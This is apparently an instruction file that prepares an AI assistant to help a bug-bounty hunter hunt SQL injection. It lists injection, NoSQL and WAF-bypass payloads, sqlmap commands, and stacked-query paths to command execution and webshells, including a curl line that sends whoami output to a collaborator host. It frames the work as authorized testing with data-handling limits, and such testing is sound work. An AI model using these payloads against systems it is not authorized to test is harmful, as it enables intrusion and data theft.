---
description: "SQL Injection hunting methodology. TRIGGER: user is testing for SQL injection (boolean blind, time-based, UNION, error-based, second-order), NoSQL injection, ORM injection, WAF bypass, or any database-query injection."
---

# /hunt-sql - SQL Injection Hunting

You are assisting **Liodeus (YesWeHack)**, whose SQLi reports include time-based blind in JSON-body endpoints, second-order via username at password-reset, GraphQL where-clause injection, and WAF bypasses with case/encoding tricks. **Modern SQLi is rare on greenfield ORMs but alive in raw-string concatenation, search filters, sort-order params, and report builders.**

## Core Philosophy

SQLi in 2026 hides in the places ORMs don't reach:
- Search/filter endpoints with custom WHERE building
- Sort/orderBy parameters (often built as string concat)
- Report builders / saved-search features
- Legacy / internal admin tools
- Stored procedures called from code
- Raw queries chosen for performance reasons

**Always fingerprint the DB first.** Postgres tricks ≠ MySQL tricks ≠ MSSQL tricks. Wasted payloads if you target the wrong engine.

## SQLi Chains (from real reports)

### Chain 1: Boolean-blind in search filter → user enumeration → ATO
1. Endpoint: `GET /api/search?q=foo&filter=email`
2. Inject `' OR (SELECT 1 FROM users WHERE email='admin@x.com' AND length(password)>0)--`
3. Page returns differently based on truth
4. Iterate to extract password hash → crack offline → login as admin

### Chain 2: Time-based in JSON body
1. `POST /api/items {"sort":"name"}` — sort param goes into ORDER BY clause
2. Payload: `"name; SELECT pg_sleep(5)--"` or `"CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END"`
3. Confirm timing diff (3+ runs to rule out network noise)
4. Use sqlmap with `--data` and JSON `--prefix`/`--suffix`

### Chain 3: ORDER BY injection
ORDER BY can't be parameterized in most DBs — devs concat. Look for any sort/order param.
* MySQL: `ORDER BY (CASE WHEN (1=1) THEN id ELSE name END)`
* Postgres: `ORDER BY (CASE WHEN ... THEN ... ELSE ... END)`
* MSSQL: stacked queries possible: `ORDER BY 1; WAITFOR DELAY '0:0:5'--`

### Chain 4: Second-order SQLi
1. Username on signup goes into DB unfiltered (because parameterized at INSERT)
2. Later, password-reset / admin lookup builds query as string with that username
3. Username `admin'--` then password reset by username triggers SQLi
4. Hard to detect — needs you to *trace* an injectable string through workflows

### Chain 5: GraphQL where-clause / filter injection
1. GraphQL filter args: `{ users(where: { email: "..." }) }` 
2. Some resolvers stringify the filter into a SQL WHERE
3. Inject in the value: `"' OR 1=1--"` 
4. Or in the field name (rarer but seen in ad-hoc resolvers)

### Chain 6: NoSQL injection (MongoDB)
1. JSON body `{"username":"admin","password":"..."}`
2. Replace string with operator object: `{"username":"admin","password":{"$ne":null}}` → bypass auth
3. Or `{"$regex":"^a","$options":"i"}` → enumerate
4. Server-side JS in `$where` clauses → eval injection (less common now)

### Chain 7: Stacked queries → RCE on MSSQL / Postgres
* MSSQL: `; EXEC xp_cmdshell 'whoami'--` (needs xp_cmdshell enabled — rare in 2026)
* Postgres: `; COPY (SELECT '') TO PROGRAM 'curl http://collab/$(whoami)'--` (needs superuser)
* MySQL: `INTO OUTFILE` for file write → webshell (needs FILE privilege + writable webroot)

### Chain 8: ORM injection (Hibernate HQL, Django ORM, ActiveRecord)
* Hibernate HQL: `from User u where u.email='${input}'` — even though "ORM", string concat → HQL injection (limited but read-able)
* Django: `User.objects.extra(where=["email='%s'" % user_input])` — `extra()` is a footgun
* ActiveRecord: `User.where("email = '#{params[:email]}'")` — same

## Discovery Methodology

### Step 1: Inventory injection points
Every parameter, every body field, every header that ends up near data:
* Query strings
* Body fields (JSON, form, multipart)
* Cookies that look like IDs / filters
* Custom headers (`X-Search-Filter`, `X-Tenant`)
* GraphQL variables, filter inputs, orderBy args
* SOAP body fields

### Step 2: Detection probes (in order)
1. **Quote test:** append `'` or `"` — error → likely SQLi (capture error text — DB engine fingerprint)
2. **Comment test:** `'--` or `'#` — does the page render normally? Bypass = injectable
3. **Boolean test:** `' AND 1=1--` vs `' AND 1=2--` — different responses = boolean-blind
4. **Time test:** `'; SELECT pg_sleep(5)--` (or `; WAITFOR DELAY '0:0:5'--` MSSQL, `'; SELECT SLEEP(5)--` MySQL) — 3+ runs to rule out noise
5. **OOB test:** Postgres `COPY (SELECT '') TO PROGRAM 'curl http://collab/'` (rare); Oracle `UTL_HTTP.request` (rare); MSSQL `xp_dirtree '\\collab.example.com\test'` — works often on Windows hosts
6. **JSON-context test:** if body is JSON, also test `'` inside string AND `]}` to break the JSON parsing

### Step 3: Database fingerprinting
Once injectable, identify the engine:
* MySQL: `SELECT @@version`, `SELECT version()` (also Postgres), `LIMIT 0,1`
* Postgres: `SELECT version()`, `||` for concat (MySQL needs `CONCAT()`)
* MSSQL: `@@version`, `DB_NAME()`, `WAITFOR DELAY`
* Oracle: `(SELECT banner FROM v$version)`, `||` concat, dual table required
* SQLite: `sqlite_version()`, no UNION-based out of box on read-only
* Comment styles: `--` (most), `#` (MySQL), `/* */` (MySQL/MSSQL/Postgres)

### Step 4: Run sqlmap on confirmed candidates
sqlmap is the industrial tool — use it once you've confirmed manually:
```
sqlmap -u "https://target.com/api/x?id=1" \
  --cookie "session=..." --level 5 --risk 3 \
  --batch --random-agent
```
For JSON body:
```
sqlmap -u "https://target.com/api/x" \
  --method POST --data '{"id":1}' \
  --headers="Content-Type: application/json" \
  --cookie "session=..." --level 5 --risk 3 -p id
```
Use `-r request.txt` mode with raw Burp/Caido request for complex auth.

### Step 5: WAF bypass
* Case variation: `SeLeCt` instead of `SELECT`
* Comment in keyword: `SE/**/LECT`, `UN/**/ION`
* Spaces → tabs/newlines/`/**/` in MySQL
* Encoding: URL, double-URL, Unicode (`%c0%a7` for `'`)
* Keyword splitting: `UNION SELECT` → `UNION/**//*!50000SELECT*/`
* Use scientific notation / hex for numbers: `0x61646d696e` instead of `'admin'`
* Whitespace alternatives in MySQL: `SELECT(1)FROM(users)`

## Impact Demonstration

* For boolean blind: extract a non-sensitive value first (DB version, current_user)
* For time-based: 3+ timing measurements showing controllable delay
* If extracting data, extract a small known target (your own user record) to prove read access — don't dump tables
* If write access (`UPDATE` injection), demonstrate on data you own
* For RCE chains via SQLi (xp_cmdshell, COPY PROGRAM), execute `id`/`whoami` only and document

## Key Considerations

* **Never dump production data.** A schema leak + small known-record extraction is plenty for proof. Mass extraction is illegal everywhere.
* Don't use destructive payloads. `UPDATE`/`DELETE`/`DROP` even on a test record can damage production
* Time-based + WAF can be slow; use higher delay thresholds (10s) to overcome WAF noise
* For JSON bodies, sqlmap needs explicit `-p` parameter targeting; bare auto-detect often misses
* `--tamper=...` scripts in sqlmap (especially `space2comment`, `between`, `randomcase`) help with WAF
* Many "SQLi" reports are actually unintended-string-concat — the bar for impact is **demonstrate data access or modification on data the attacker shouldn't reach**
* For NoSQL injection, also check the response shape — Mongo errors leak the query structure
